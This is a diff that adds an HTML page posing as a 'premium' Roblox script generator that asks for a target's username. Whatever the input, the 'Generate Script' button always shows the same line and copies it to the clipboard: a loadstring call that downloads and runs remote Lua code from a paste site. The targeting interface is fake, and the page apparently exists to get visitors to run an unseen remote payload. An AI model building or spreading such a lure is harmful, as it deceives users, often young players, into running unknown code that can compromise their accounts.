@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matiwebhub | Premium Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #0a0a0c; color: #fff; font-family: 'Inter', sans-serif; }
+        .panel { background: #121217; border: 1px solid #1f1f27; }
+        .input-dark { background: #1c1c24; border: 1px solid #2d2d39; }
+        .input-dark:focus { border-color: #6366f1; outline: none; }
+        .btn-main { background: #6366f1; transition: 0.2s; }
+        .btn-main:disabled { background: #2d2d39; color: #555; }
+        .live-tag { background: rgba(34, 197, 94, 0.1); color: #22c55e; border: 1px solid rgba(34, 197, 94, 0.2); }
+    </style>
+</head>
+<body class="p-4 flex justify-center min-h-screen">
+    <div class="max-w-md w-full space-y-6">
+        
+        <div class="flex flex-col items-center space-y-4">
+            <div class="live-tag px-3 py-1 rounded-full text-[10px] font-bold flex items-center gap-2">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                LIVE · Script Generator Online
+            </div>
+            <h1 class="text-4xl font-black tracking-tighter text-white uppercase">MATIWEBHUB</h1>
+            <p class="text-center text-gray-400 text-sm px-4">
+                Premium automated script generation for your Roblox targets — fast, secure, and ready to deploy.
+            </p>
+        </div>
+
+        <div class="panel p-6 rounded-2xl space-y-4">
+            <label class="text-xs font-bold text-gray-400 uppercase">Roblox Username</label>
+            <input type="text" id="userInput" oninput="checkUser()" placeholder="Enter Roblox username..." 
+                   class="w-full p-3 rounded-xl input-dark text-sm">
+            
+            <div id="profileSelect" class="hidden">
+                <div onclick="selectProfile()" class="flex items-center space-x-3 p-3 border border-indigo-500 bg-indigo-500/10 rounded-xl cursor-pointer">
+                    <div class="w-10 h-10 bg-gray-700 rounded-full flex items-center justify-center text-xs">👤</div>
+                    <div>
+                        <p id="targetName" class="text-sm font-bold"></p>
+                        <p class="text-[10px] text-indigo-400 font-bold uppercase">PROFILE FOUND</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel p-4 rounded-2xl">
+            <button id="freezeBtn" disabled class="w-full p-3 rounded-xl bg-gray-800 text-xs font-black uppercase text-gray-500 border border-transparent transition-all">
+                SCRIPT FREEZE
+            </button>
+        </div>
+
+        <button id="genBtn" onclick="generate()" disabled class="w-full p-5 rounded-2xl btn-main font-black uppercase tracking-widest shadow-lg shadow-indigo-500/20">
+            Generate Script
+        </button>
+
+        <div id="outputContainer" class="hidden panel p-4 rounded-2xl border-indigo-500/30 bg-black">
+            <div class="text-[9px] text-gray-500 mb-2 uppercase">Generated Payload:</div>
+            <code id="display" class="text-[10px] break-all text-indigo-300 font-mono"></code>
+        </div>
+    </div>
+
+    <script>
+        function checkUser() {
+            const val = document.getElementById('userInput').value;
+            const profile = document.getElementById('profileSelect');
+            if(val.length > 2) {
+                profile.classList.remove('hidden');
+                document.getElementById('targetName').textContent = val;
+            } else {
+                profile.classList.add('hidden');
+                document.getElementById('freezeBtn').disabled = true;
+                document.getElementById('genBtn').disabled = true;
+            }
+        }
+
+        function selectProfile() {
+            const freeze = document.getElementById('freezeBtn');
+            const gen = document.getElementById('genBtn');
+            
+            freeze.disabled = false;
+            freeze.classList.remove('bg-gray-800', 'text-gray-500');
+            freeze.classList.add('bg-indigo-600', 'text-white', 'border-indigo-400');
+            
+            gen.disabled = false;
+        }
+
+        function generate() {
+            const script = 'loadstring(game:HttpGet("https://pastefy.app/e8DClYOX/raw"))()';
+            const container = document.getElementById('outputContainer');
+            const display = document.getElementById('display');
+            
+            display.textContent = script;
+            container.classList.remove('hidden');
+            
+            const el = document.createElement('textarea');
+            el.value = script;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+
+            const btn = document.getElementById('genBtn');
+            btn.textContent = "COPIED!";
+            setTimeout(() => { btn.textContent = "Generate Script"; }, 2000);
+        }
+    </script>
+</body>
+</html>
